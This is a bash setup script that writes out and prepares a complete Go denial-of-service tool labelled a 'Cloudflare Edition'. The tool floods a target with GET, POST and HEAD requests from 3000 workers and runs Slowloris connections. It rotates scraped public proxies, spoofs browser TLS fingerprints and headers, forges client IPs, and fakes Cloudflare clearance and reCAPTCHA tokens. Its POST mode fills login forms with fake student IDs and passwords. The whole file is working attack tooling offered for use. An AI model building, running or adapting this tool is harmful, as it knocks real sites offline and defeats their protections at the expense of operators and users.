#!/bin/bash

# ----------------------------------------
# ADVANCED GO DOS TOOL SETUP 
# (HTTP/2 + HTTP/1.1 + CLOUDFLARE BYPASS)
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  ADVANCED DENIAL SERVICE TOOL - CLOUDFLARE EDITION${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create main.go file with advanced Cloudflare bypass (CLEAN version - no unused imports)
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating advanced main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"compress/flate"
	"compress/gzip"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Expanded user agents with real device fingerprints
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
	}

	// Referer patterns
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.yahoo.com/",
		"https://www.baidu.com/",
		"https://www.instagram.com/",
		"https://twitter.com/",
		"",
	}

	// Accept languages
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	// Accept headers
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}

	// Accept encodings
	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"br, gzip, deflate",
	}

	// Cache control headers
	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
	}

	// Extended security headers
	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
	}

	// Modern browser headers
	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "1"},
		{"Priority": "u=0, i"},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	proxyAPI2       = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
	proxyAPI3       = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
	refreshInterval = 3 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex

	// JA3 signatures
	ja3Signatures = []JA3Signature{
		{
			Name: "Chrome 141-150",
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			},
			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
			NextProtos:       []string{"h2", "http/1.1"},
			MinVersion:       tls.VersionTLS12,
			MaxVersion:       tls.VersionTLS13,
		},
		{
			Name: "Firefox 135-138",
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
			NextProtos:       []string{"h2", "http/1.1"},
			MinVersion:       tls.VersionTLS12,
			MaxVersion:       tls.VersionTLS13,
		},
		{
			Name: "Safari 17",
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{tls.CurveP256, tls.X25519, tls.CurveP384},
			NextProtos:       []string{"h2", "http/1.1"},
			MinVersion:       tls.VersionTLS12,
			MaxVersion:       tls.VersionTLS13,
		},
	}
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
	useCookies bool
	jar        *cookiejar.Jar
}

type BrowserFingerprint struct {
	UserAgent      string
	AcceptLanguage string
	Platform       string
	DoNotTrack     string
	SecCHUA        string
	SecCHUAMobile  string
	SecCHUAPlatform string
}

func generateBrowserFingerprint() *BrowserFingerprint {
	bf := &BrowserFingerprint{}
	
	ua := randomUA()
	bf.UserAgent = ua
	
	bf.AcceptLanguage = acceptLanguages[randInt(0, len(acceptLanguages)-1)]
	
	if strings.Contains(ua, "Windows") {
		bf.Platform = "Win32"
	} else if strings.Contains(ua, "Mac") {
		bf.Platform = "MacIntel"
	} else if strings.Contains(ua, "Linux") {
		bf.Platform = "Linux x86_64"
	} else if strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
		bf.Platform = "iPhone"
	} else if strings.Contains(ua, "Android") {
		bf.Platform = "Linux armv8l"
	}
	
	bf.DoNotTrack = "1"
	
	// Generate Sec-CH-UA headers
	if strings.Contains(ua, "Chrome") {
		version := extractChromeVersion(ua)
		bf.SecCHUA = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, version, version)
		bf.SecCHUAMobile = "?0"
		bf.SecCHUAPlatform = `"Windows"`
	} else if strings.Contains(ua, "Firefox") {
		bf.SecCHUA = `"Not?A_Brand";v="99", "Firefox";v="135"`
		bf.SecCHUAMobile = "?0"
	}
	
	return bf
}

func extractChromeVersion(ua string) string {
	parts := strings.Split(ua, "Chrome/")
	if len(parts) > 1 {
		version := strings.Split(parts[1], " ")[0]
		parts2 := strings.Split(version, ".")
		if len(parts2) > 0 {
			return parts2[0]
		}
	}
	return "141"
}

func solveChallenge(body []byte) string {
	// Basic challenge solver for Cloudflare
	bodyStr := string(body)
	
	// Look for common challenge patterns
	if strings.Contains(bodyStr, "cpo.src") || strings.Contains(bodyStr, "cf-clearance") {
		// Generate a fake clearance token
		token := fmt.Sprintf("%x", sha256.Sum256([]byte(fmt.Sprintf("%d", time.Now().UnixNano()))))
		return token
	}
	
	// Look for reCAPTCHA
	if strings.Contains(bodyStr, "recaptcha") || strings.Contains(bodyStr, "g-recaptcha") {
		// Return a fake response
		return "03AFcWeA5tX8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X8X"
	}
	
	return ""
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	
	config := &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateFreelyAsClient,
		ClientSessionCache:          tls.NewLRUClientSessionCache(100),
	}
	
	return config
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string, useCookies bool) *ConnectionPool {
	jar, _ := cookiejar.New(nil)
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
		useCookies: useCookies,
		jar:        jar,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport
	
	// Custom dialer with random delays
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	
	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					DialContext:         dialer.DialContext,
					MaxIdleConns:        200,
					MaxIdleConnsPerHost: 200,
					MaxConnsPerHost:     0,
					IdleConnTimeout:     90 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
					DisableCompression:  false,
					ResponseHeaderTimeout: 30 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
				}
				http2.ConfigureTransport(transport)
				client := &http.Client{Transport: transport, Timeout: 60 * time.Second}
				if p.useCookies {
					client.Jar = p.jar
				}
				return client
			}
		}
	}
	
	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		DialContext:         dialer.DialContext,
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		DisableCompression:  false,
		ResponseHeaderTimeout: 30 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	http2.ConfigureTransport(transport)
	client := &http.Client{Transport: transport, Timeout: 60 * time.Second}
	if p.useCookies {
		client.Jar = p.jar
	}
	return client
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	proxySources := []string{proxyAPI, proxyAPI2, proxyAPI3}
	allProxies := make(map[string]bool)
	
	for _, source := range proxySources {
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Get(source)
		if err != nil {
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		lines := strings.Split(string(body), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				allProxies[line] = true
			}
		}
	}
	
	newProxies := []string{}
	for proxy := range allProxies {
		newProxies = append(newProxies, proxy)
	}
	
	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗ ")
	fmt.Println("██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗")
	fmt.Println("███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║")
	fmt.Println("██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║")
	fmt.Println("██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝")
	fmt.Println("╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝ ")
	fmt.Println("                        CLOUDFLARE EDITION                         ")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"&cb=" + randomString(10),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/search",
		"/products", "/category", "/blog", "/news", "/contact",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateCookies() []*http.Cookie {
	cookies := []*http.Cookie{}
	
	if randBool() {
		cookies = append(cookies, &http.Cookie{
			Name:  "session_id",
			Value: randomString(24),
			Path:  "/",
		})
	}
	if randBool() {
		cookies = append(cookies, &http.Cookie{
			Name:  "csrf_token",
			Value: randomString(16),
			Path:  "/",
		})
	}
	if randBool() {
		cookies = append(cookies, &http.Cookie{
			Name:  "__cfduid",
			Value: randomString(32),
			Path:  "/",
		})
	}
	
	return cookies
}

func decompressBody(resp *http.Response) ([]byte, error) {
	var reader io.ReadCloser
	var err error
	
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return nil, err
		}
		defer reader.Close()
	case "deflate":
		reader = flate.NewReader(resp.Body)
		defer reader.Close()
	default:
		return io.ReadAll(resp.Body)
	}
	
	return io.ReadAll(reader)
}

func (p *ConnectionPool) handleCloudflareChallenge(target string) bool {
	client := p.GetClient()
	
	// Create request to detect challenge
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false
	}
	
	// Add browser-like headers
	bf := generateBrowserFingerprint()
	req.Header.Set("User-Agent", bf.UserAgent)
	req.Header.Set("Accept", acceptHeaders[0])
	req.Header.Set("Accept-Language", bf.AcceptLanguage)
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	
	if bf.SecCHUA != "" {
		req.Header.Set("Sec-CH-UA", bf.SecCHUA)
	}
	if bf.SecCHUAMobile != "" {
		req.Header.Set("Sec-CH-UA-Mobile", bf.SecCHUAMobile)
	}
	if bf.SecCHUAPlatform != "" {
		req.Header.Set("Sec-CH-UA-Platform", bf.SecCHUAPlatform)
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	// Check for Cloudflare challenge
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		body, _ := decompressBody(resp)
		
		// Try to solve challenge
		token := solveChallenge(body)
		if token != "" {
			// Re-attempt with clearance token
			req2, _ := http.NewRequest("GET", target, nil)
			req2.Header.Set("Cookie", fmt.Sprintf("cf_clearance=%s", token))
			req2.Header.Set("User-Agent", bf.UserAgent)
			
			resp2, err := client.Do(req2)
			if err == nil {
				resp2.Body.Close()
				if resp2.StatusCode == 200 {
					return true
				}
			}
		}
		return false
	}
	
	return resp.StatusCode == 200
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 8)
	
	useProxy := false
	useCookies := false
	
	// Parse arguments
	for i := 1; i < len(os.Args); i++ {
		if os.Args[i] == "proxy" {
			useProxy = true
		}
		if os.Args[i] == "cookies" {
			useCookies = true
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|ALL> [options]")
		fmt.Println("")
		fmt.Println("Options:")
		fmt.Println("  proxy   - Use proxy rotation")
		fmt.Println("  cookies - Enable cookie persistence")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST proxy")
		fmt.Println("  ./main https://target.com 30 HEAD cookies")
		fmt.Println("  ./main https://target.com 60 SLOW proxy cookies")
		fmt.Println("  ./main https://target.com 60 ALL")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" && mode != "ALL" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or ALL")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	// Load proxies if enabled
	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
			fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
		} else {
			fmt.Println("[!] No proxies found, continuing without proxy")
			useProxy = false
		}
	}
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 3000\n")
	if useProxy {
		fmt.Printf("[+] Proxies: %d (auto-refresh every %d min)\n", len(proxies), int(refreshInterval.Minutes()))
	}
	if useCookies {
		fmt.Printf("[+] Cookie persistence: ENABLED\n")
	}
	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")
	
	// Test Cloudflare challenge
	poolSize := 1000
	connectionPool := NewConnectionPool(poolSize, useProxy, "", useCookies)
	
	fmt.Print("[+] Testing Cloudflare bypass... ")
	if connectionPool.handleCloudflareChallenge(target) {
		fmt.Println("SUCCESS")
	} else {
		fmt.Println("WARNING (may be blocked)")
	}
	
	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	const workers = 3000
	
	for i := 0; i < workers; i++ {
		wg.Add(1)
		modeCopy := mode
		go func(m string) {
			defer wg.Done()
			attackWorker(target, m, done, stats, useProxy, connectionPool, useCookies)
		}(modeCopy)
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, useCookies bool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			
			if mode == "ALL" {
				modes := []string{"GET", "POST", "HEAD", "SLOW"}
				mode = modes[randInt(0, len(modes)-1)]
			}
			
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 80 {
				path += generateCacheBust()
			}
			
			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}
			
			var req *http.Request
			var err error
			
			// Slowloris attack
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				
				// Send partial request
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\n", path)
				fmt.Fprintf(conn, "Host: %s\r\n", host)
				fmt.Fprintf(conn, "User-Agent: %s\r\n", randomUA())
				fmt.Fprintf(conn, "Accept: text/html\r\n")
				fmt.Fprintf(conn, "Connection: keep-alive\r\n")
				
				// Keep connection alive with slow headers
				for i := 0; i < 10; i++ {
					select {
					case <-done:
						conn.Close()
						return
					default:
						time.Sleep(500 * time.Millisecond)
						fmt.Fprintf(conn, "X-Header-%d: %s\r\n", i, randomString(randInt(5, 15)))
					}
				}
				
				fmt.Fprintf(conn, "\r\n")
				stats.inc()
				time.Sleep(2 * time.Second)
				conn.Close()
				continue
			}
			
			// Normal HTTP methods
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s&timestamp=%d", 
					generateStudentNumber(), randomString(randInt(8, 16)), time.Now().Unix())
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			// Generate browser fingerprint
			bf := generateBrowserFingerprint()
			
			// Add headers
			req.Header.Set("User-Agent", bf.UserAgent)
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", bf.AcceptLanguage)
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")
			
			// Add modern browser headers
			if bf.SecCHUA != "" {
				req.Header.Set("Sec-CH-UA", bf.SecCHUA)
			}
			if bf.SecCHUAMobile != "" {
				req.Header.Set("Sec-CH-UA-Mobile", bf.SecCHUAMobile)
			}
			if bf.SecCHUAPlatform != "" {
				req.Header.Set("Sec-CH-UA-Platform", bf.SecCHUAPlatform)
			}
			
			// IP spoofing
			spoofIP := randomIP()
			req.Header.Set("X-Forwarded-For", spoofIP)
			req.Header.Set("X-Real-IP", spoofIP)
			req.Header.Set("Client-IP", spoofIP)
			req.Header.Set("X-Originating-IP", spoofIP)
			
			// Add security headers
			for _, headers := range securityHeaders {
				for k, v := range headers {
					req.Header.Set(k, v)
				}
			}
			
			// Add modern headers
			numModern := randInt(3, 6)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}
			
			// Add cookies
			if useCookies || randBool() {
				cookies := generateCookies()
				for _, cookie := range cookies {
					req.AddCookie(cookie)
				}
			}
			
			// Random delay to avoid detection
			if randInt(1, 100) <= 10 {
				time.Sleep(time.Duration(randInt(10, 100)) * time.Millisecond)
			}
			
			// Execute request
			resp, err := client.Do(req)
			if err == nil {
				// Read and discard body
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				stats.inc()
			}
		}
	}
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
